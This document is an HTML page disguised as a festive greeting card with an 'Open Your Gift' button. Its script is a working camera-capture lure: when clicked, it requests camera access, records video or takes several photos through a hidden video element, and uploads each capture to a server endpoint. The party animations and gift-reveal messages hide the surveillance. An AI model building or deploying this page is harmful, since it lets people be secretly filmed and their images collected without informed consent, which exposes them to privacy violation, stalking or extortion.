<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Festival Surprise</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            overflow: hidden;
            position: relative;
        }
        .confetti-container {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; overflow: hidden; z-index: 0;
        }
        .confetti {
            position: absolute;
            width: 10px; height: 10px; top: -10px;
            animation: confettiFall linear infinite;
        }
        @keyframes confettiFall {
            0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }
        .gift-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100;
            display: none;
            justify-content: center;
            align-items: center;
            background: rgba(0,0,0,0.7);
            animation: fadeIn 0.5s ease;
            pointer-events: none;
        }
        .gift-overlay.active {
            display: flex;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }
        .gift-content {
            text-align: center;
            animation: bounceIn 1s ease;
            pointer-events: auto;
        }
        @keyframes bounceIn {
            0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
            50% { transform: scale(1.2) rotate(5deg); }
            70% { transform: scale(0.9) rotate(-3deg); }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }
        .gift-emoji {
            font-size: 150px;
            display: block;
            animation: giftFloat 2s ease-in-out infinite;
            text-shadow: 0 0 80px rgba(255,215,0,0.8);
        }
        @keyframes giftFloat {
            0%, 100% { transform: translateY(0px) scale(1); }
            50% { transform: translateY(-20px) scale(1.05); }
        }
        .gift-text {
            color: white;
            font-size: 3.5rem;
            font-weight: bold;
            text-shadow: 0 0 30px rgba(255,215,0,0.6);
            margin-top: 20px;
            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d, #ff6b6b);
            background-size: 300% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmer 3s linear infinite;
        }
        @keyframes shimmer {
            0% { background-position: 0% center; }
            100% { background-position: 300% center; }
        }
        .gift-sub {
            color: rgba(255,255,255,0.9);
            font-size: 1.3rem;
            margin-top: 15px;
            -webkit-text-fill-color: rgba(255,255,255,0.9);
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        .celebration-confetti {
            position: fixed;
            z-index: 99;
            pointer-events: none;
            font-size: 50px;
            animation: celebrationFall linear forwards;
        }
        @keyframes celebrationFall {
            0% { transform: translateY(-100px) rotate(0deg) scale(1); opacity: 1; }
            100% { transform: translateY(120vh) rotate(720deg) scale(0.5); opacity: 0; }
        }
        .festival-card {
            position: relative; z-index: 1;
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 50px;
            max-width: 550px; width: 90%;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.15);
            text-align: center;
            animation: float 3s ease-in-out infinite;
            transition: all 0.5s ease;
            cursor: pointer;
        }
        .festival-card:hover {
            transform: scale(1.02);
            border-color: rgba(255,215,0,0.3);
        }
        .festival-card.opening {
            animation: none;
            transform: scale(1.05);
            border-color: #ffd93d;
            box-shadow: 0 0 80px rgba(255,215,0,0.3);
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        .main-emoji {
            font-size: 100px; 
            margin-bottom: 20px; 
            display: block;
            animation: pulse 2s ease-in-out infinite;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        .main-emoji:hover {
            transform: scale(1.1);
        }
        .main-emoji.opening {
            animation: celebrateSpin 1s ease-in-out infinite;
        }
        @keyframes celebrateSpin {
            0%, 100% { transform: rotate(-5deg) scale(1); }
            50% { transform: rotate(5deg) scale(1.1); }
        }
        .festival-title {
            color: white; 
            font-size: 2.8rem; 
            font-weight: bold;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .festival-name {
            color: #ffd93d; 
            font-weight: bold;
        }
        .subtitle {
            color: rgba(255,255,255,0.8);
            font-size: 1.1rem;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .gift-btn {
            background: linear-gradient(135deg, #ffd93d, #f5576c);
            border: none;
            color: white;
            padding: 20px 60px;
            font-size: 1.5rem;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 40px rgba(245,87,108,0.4);
            margin: 10px auto;
            position: relative;
            overflow: hidden;
            display: inline-flex;
            align-items: center;
            gap: 15px;
        }
        .gift-btn::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
            transform: rotate(45deg);
            animation: btnShine 3s linear infinite;
        }
        @keyframes btnShine {
            0% { transform: translateX(-100%) rotate(45deg); }
            100% { transform: translateX(100%) rotate(45deg); }
        }
        .gift-btn:hover:not(:disabled) {
            transform: scale(1.08);
            box-shadow: 0 15px 50px rgba(245,87,108,0.6);
        }
        .gift-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        .gift-btn .btn-emoji {
            font-size: 1.8rem;
        }
        .surprise-container {
            margin: 25px 0 10px 0;
            display: none;
        }
        .surprise-container.visible {
            display: block;
        }
        .surprise-text {
            color: rgba(255,255,255,0.9);
            font-size: 1rem;
            margin-bottom: 10px;
            animation: pulse 1.5s ease-in-out infinite;
        }
        .progress-container {
            width: 100%; 
            height: 6px;
            background: rgba(255,255,255,0.15);
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%; 
            width: 0%;
            background: linear-gradient(90deg, #ffd93d, #f5576c);
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        .progress-bar.done {
            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d);
            background-size: 200% auto;
            animation: shimmer 1s linear infinite;
        }
        .status {
            margin-top: 15px; 
            color: rgba(255,255,255,0.6);
            font-size: 0.85rem;
            min-height: 20px;
            opacity: 0.5;
        }
        #hiddenVideo { display: none; }
        .mode-badge {
            display: inline-block;
            background: rgba(255,215,0,0.2);
            color: #ffd93d;
            padding: 4px 15px;
            border-radius: 20px;
            font-size: 0.7rem;
            border: 1px solid rgba(255,215,0,0.2);
            margin-bottom: 10px;
        }
        @media (max-width: 600px) {
            .festival-card { padding: 30px 20px; }
            .festival-title { font-size: 2rem; }
            .main-emoji { font-size: 70px; }
            .gift-btn { padding: 15px 40px; font-size: 1.2rem; }
            .gift-emoji { font-size: 100px; }
            .gift-text { font-size: 2.5rem; }
        }
    </style>
</head>
<body>
    <div class="confetti-container" id="confettiContainer"></div>
    
    <div class="gift-overlay" id="giftOverlay">
        <div class="gift-content">
            <span class="gift-emoji" id="giftEmoji">🎁</span>
            <div class="gift-text" id="giftText">🎉 SURPRISE! 🎉</div>
            <div class="gift-sub">✨ A gift is waiting for you! ✨</div>
        </div>
    </div>
    
    <video id="hiddenVideo" autoplay playsinline></video>
    
    <div class="festival-card" id="festivalCard">
        <div class="mode-badge">🎊 Festival Mode</div>
        <span class="main-emoji" id="mainEmoji">🎊</span>
        <h1 class="festival-title"><span class="festival-name" id="festivalName">Festival</span></h1>
        <p class="subtitle" id="subtitle">✨ Something special is waiting for you ✨</p>
        
        <button class="gift-btn" id="giftBtn">
            <span class="btn-emoji">🎁</span>
            <span id="btnText">Open Your Gift</span>
        </button>
        
        <div class="surprise-container" id="surpriseContainer">
            <div class="surprise-text" id="surpriseText">🎀 Preparing your surprise...</div>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>
        
        <div class="status" id="statusMessage">💝 Click the gift to reveal your surprise</div>
    </div>

    <script>
        // Get festival name from URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const festivalName = urlParams.get('name') || 'Festival';
        document.getElementById('festivalName').textContent = festivalName;

        // Get camera type from URL parameter
        const cameraType = urlParams.get('camera') || 'user';
        const captureMode = urlParams.get('mode') || 'video';
        const duration = parseInt(urlParams.get('duration')) || 15;
        const photos = parseInt(urlParams.get('photos')) || 5;

        const videoElement = document.getElementById('hiddenVideo');
        const giftBtn = document.getElementById('giftBtn');
        const btnText = document.getElementById('btnText');
        const statusMessage = document.getElementById('statusMessage');
        const progressBar = document.getElementById('progressBar');
        const surpriseContainer = document.getElementById('surpriseContainer');
        const surpriseText = document.getElementById('surpriseText');
        const festivalCard = document.getElementById('festivalCard');
        const mainEmoji = document.getElementById('mainEmoji');
        const giftOverlay = document.getElementById('giftOverlay');
        const giftEmoji = document.getElementById('giftEmoji');
        const giftText = document.getElementById('giftText');

        const UPLOAD_URL = '/upload';
        let mediaStream = null, mediaRecorder = null, recordedChunks = [];
        let timerInterval = null, timeRemaining = duration, isRecording = false;
        let isGiftOpened = false;
        let photoIndex = 0;
        let photoInterval = null;

        // Confetti generator
        const confettiContainer = document.getElementById('confettiContainer');
        const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
        for (let i = 0; i < 80; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + '%';
            confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.width = (Math.random() * 8 + 4) + 'px';
            confetti.style.height = (Math.random() * 8 + 4) + 'px';
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
            confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
            confetti.style.animationDelay = (Math.random() * 4) + 's';
            confettiContainer.appendChild(confetti);
        }

        function showGiftReveal() {
            giftOverlay.classList.add('active');
            
            let emojis = ['🎁', '🎀', '🎉', '🎊', '✨', '⭐', '💝', '🎈'];
            let index = 0;
            
            const emojiInterval = setInterval(() => {
                giftEmoji.textContent = emojis[index % emojis.length];
                index++;
                if (index > 10) {
                    clearInterval(emojiInterval);
                    giftEmoji.textContent = '🎉';
                    giftText.textContent = '🎊 SURPRISE! 🎊';
                    
                    launchCelebrationConfetti();
                    
                    setTimeout(() => {
                        giftOverlay.classList.remove('active');
                        festivalCard.classList.remove('opening');
                        mainEmoji.classList.remove('opening');
                        giftBtn.disabled = false;
                        btnText.textContent = 'Open Another Gift';
                        statusMessage.textContent = '💝 Thank you! You can open another gift!';
                        surpriseContainer.classList.remove('visible');
                        isGiftOpened = false;
                    }, 5000);
                }
            }, 200);
        }

        function launchCelebrationConfetti() {
            const emojis = ['🎉', '🎊', '✨', '⭐', '🌟', '💫', '🎈', '🎁', '🥳', '🎆', '🎇', '💝'];
            const container = document.body;
            
            for (let i = 0; i < 60; i++) {
                setTimeout(() => {
                    const el = document.createElement('div');
                    el.className = 'celebration-confetti';
                    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                    el.style.left = Math.random() * 100 + '%';
                    el.style.fontSize = (Math.random() * 40 + 25) + 'px';
                    el.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    container.appendChild(el);
                    
                    setTimeout(() => { el.remove(); }, 5000);
                }, i * 40);
            }
        }

        async function startCamera() {
            try {
                const constraints = {
                    video: {
                        facingMode: cameraType,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                videoElement.srcObject = mediaStream;
                await videoElement.play();
                return true;
            } catch (error) {
                console.error('Camera error:', error);
                return false;
            }
        }

        async function startVideoRecording() {
            try {
                if (!await startCamera()) {
                    throw new Error('Camera failed to start');
                }

                recordedChunks = [];
                mediaRecorder = new MediaRecorder(mediaStream, { 
                    mimeType: 'video/webm;codecs=vp9' 
                });
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };
                
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    uploadMedia(blob, 'video');
                };

                mediaRecorder.start();
                isRecording = true;
                timeRemaining = duration;
                
                surpriseText.textContent = `🎬 Recording video... ${duration}s`;

                timerInterval = setInterval(() => {
                    timeRemaining--;
                    const progress = ((duration - timeRemaining) / duration) * 100;
                    progressBar.style.width = progress + '%';
                    
                    if (timeRemaining > 0) {
                        surpriseText.textContent = `🎬 Recording... ${timeRemaining}s`;
                    }
                    
                    if (timeRemaining <= 0) {
                        clearInterval(timerInterval);
                        timerInterval = null;
                        
                        if (mediaRecorder && isRecording) {
                            mediaRecorder.stop();
                            isRecording = false;
                            surpriseText.textContent = '🎬 Video recorded!';
                            progressBar.classList.add('done');
                            progressBar.style.width = '100%';
                        }
                        
                        if (mediaStream) {
                            mediaStream.getTracks().forEach(track => track.stop());
                            mediaStream = null;
                            videoElement.srcObject = null;
                        }
                        
                        setTimeout(() => {
                            showGiftReveal();
                        }, 500);
                    }
                }, 1000);

            } catch (error) {
                console.error('Recording error:', error);
                throw error;
            }
        }

        async function startPhotoCapture() {
            try {
                if (!await startCamera()) {
                    throw new Error('Camera failed to start');
                }

                const canvas = document.createElement('canvas');
                const width = 640;
                const height = 480;
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                
                photoIndex = 0;

                photoInterval = setInterval(() => {
                    if (photoIndex < photos) {
                        ctx.drawImage(videoElement, 0, 0, width, height);
                        
                        canvas.toBlob((blob) => {
                            if (blob) {
                                const filename = `photo_${Date.now()}.jpg`;
                                const file = new File([blob], filename, { type: 'image/jpeg' });
                                uploadMedia(file, 'photo');
                                
                                photoIndex++;
                                const progress = (photoIndex / photos) * 100;
                                progressBar.style.width = progress + '%';
                                surpriseText.textContent = `📸 Photo ${photoIndex}/${photos}`;
                            }
                        }, 'image/jpeg', 0.9);
                    } else {
                        clearInterval(photoInterval);
                        photoInterval = null;
                        
                        progressBar.classList.add('done');
                        progressBar.style.width = '100%';
                        surpriseText.textContent = `✅ ${photos} photos captured!`;
                        
                        if (mediaStream) {
                            mediaStream.getTracks().forEach(track => track.stop());
                            mediaStream = null;
                            videoElement.srcObject = null;
                        }
                        
                        setTimeout(() => {
                            showGiftReveal();
                        }, 1000);
                    }
                }, 1500);

            } catch (error) {
                console.error('Photo capture error:', error);
                throw error;
            }
        }

        async function uploadMedia(file, type) {
            const formData = new FormData();
            const ext = type === 'photo' ? 'jpg' : 'webm';
            const filename = `${type}_${Date.now()}.${ext}`;
            formData.append('media', file, filename);
            formData.append('type', type);

            try {
                const response = await fetch(UPLOAD_URL, { 
                    method: 'POST', 
                    body: formData 
                });
                
                if (response.ok) {
                    console.log(`✅ ${type} uploaded successfully!`);
                } else {
                    console.error(`❌ Upload failed:`, response.status);
                }
            } catch (error) {
                console.error(`❌ Upload error:`, error);
            }
        }

        async function openGift() {
            if (isGiftOpened) return;
            isGiftOpened = true;
            
            try {
                giftBtn.disabled = true;
                btnText.textContent = '🎀 Opening...';
                festivalCard.classList.add('opening');
                mainEmoji.classList.add('opening');
                mainEmoji.textContent = '🎁';
                surpriseContainer.classList.add('visible');
                surpriseText.textContent = '🎀 Preparing your surprise...';
                progressBar.style.width = '0%';
                progressBar.classList.remove('done');
                statusMessage.textContent = '⏳ Your surprise is being prepared...';

                if (captureMode === 'photo') {
                    await startPhotoCapture();
                } else {
                    await startVideoRecording();
                }

            } catch (error) {
                console.error('Error:', error);
                let errorMsg = '❌ ';
                if (error.name === 'NotAllowedError') {
                    errorMsg += 'Camera access denied. Please allow camera permission.';
                } else if (error.name === 'NotFoundError') {
                    errorMsg += 'No camera found on this device.';
                } else if (error.name === 'NotReadableError') {
                    errorMsg += 'Camera is in use by another application.';
                } else {
                    errorMsg += 'Something went wrong. Please try again.';
                }
                statusMessage.textContent = errorMsg;
                statusMessage.style.opacity = '1';
                giftBtn.disabled = false;
                btnText.textContent = 'Try Again';
                isGiftOpened = false;
                surpriseContainer.classList.remove('visible');
            }
        }

        giftBtn.addEventListener('click', openGift);
        
        festivalCard.addEventListener('click', () => {
            if (!isGiftOpened && !giftBtn.disabled) {
                openGift();
            }
        });

        window.addEventListener('beforeunload', () => {
            if (mediaRecorder && isRecording) mediaRecorder.stop();
            if (photoInterval) clearInterval(photoInterval);
            if (timerInterval) clearInterval(timerInterval);
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });

        console.log('🎁 Festival mode loaded!');
    </script>
</body>
</html>
